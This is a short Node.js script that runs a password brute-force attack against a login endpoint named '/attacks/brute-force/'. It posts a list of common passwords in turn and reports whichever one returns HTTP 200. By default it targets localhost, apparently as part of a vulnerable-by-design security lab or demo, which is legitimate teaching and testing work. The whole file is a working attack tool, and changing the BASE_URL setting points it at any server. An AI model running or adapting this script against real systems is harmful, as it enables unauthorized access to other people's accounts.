#!/usr/bin/env node

const http = require('http');
const https = require('https');

const BASE_URL = process.env.BASE_URL || 'http://localhost:3000';

const makeRequest = (method, path, data = null) => {
  return new Promise((resolve, reject) => {
    const url = new URL(path, BASE_URL);
    const options = {
      hostname: url.hostname,
      port: url.port,
      path: `${url.pathname}${url.search}`,
      method,
      headers: {
        'Content-Type': 'application/json',
      },
    };

    const req = (url.protocol === 'https:' ? https : http).request(options, (res) => {
      let body = '';
      res.on('data', (chunk) => { body += chunk; });
      res.on('end', () => {
        resolve({ status: res.statusCode, data: body });
      });
    });

    req.on('error', reject);
    
    if (data) {
      req.write(JSON.stringify(data));
    }
    
    req.end();
  });
};

const bruteForceAttack = async () => {
  console.log('🔓 Starting Brute Force Attack...');
  console.log(`📍 Target: ${BASE_URL}/attacks/brute-force/`);
  console.log('='.repeat(50));
  
  // Common passwords to try
  const passwords = [
    '1234', '12345', '12385', 'password', 'admin', 'root',
    'user', 'guest', 'test', 'demo', '123456', '123456789',
    'qwerty', 'abc123', 'password123', 'admin123'
  ];
  
  let foundPassword = null;
  let attempts = 0;
  
  for (const password of passwords) {
    attempts++;
    process.stdout.write(`\r🔍 Trying password ${attempts}/${passwords.length}: ${password}`);
    
    try {
      const result = await makeRequest('POST', '/attacks/brute-force/', { password });
      
      if (result.status === 200) {
        console.log(`\n✅ SUCCESS! Password found: ${password}`);
        foundPassword = password;
        break;
      }
      
      // Add small delay to avoid overwhelming the server
      await new Promise(resolve => setTimeout(resolve, 100));
      
    } catch (error) {
      console.log(`\n❌ Error testing password ${password}:`, error.message);
    }
  }
  
  console.log(`\n${'='.repeat(50)}`);
  
  if (foundPassword) {
    console.log(`🎯 Attack successful! Valid password: ${foundPassword}`);
    console.log(`📊 Total attempts: ${attempts}`);
    return foundPassword;
  } else {
    console.log('❌ Attack failed - no valid password found');
    console.log(`📊 Total attempts: ${attempts}`);
    return null;
  }
};

// Run if called directly
if (require.main === module) {
  bruteForceAttack().catch(console.error);
}

module.exports = { bruteForceAttack };
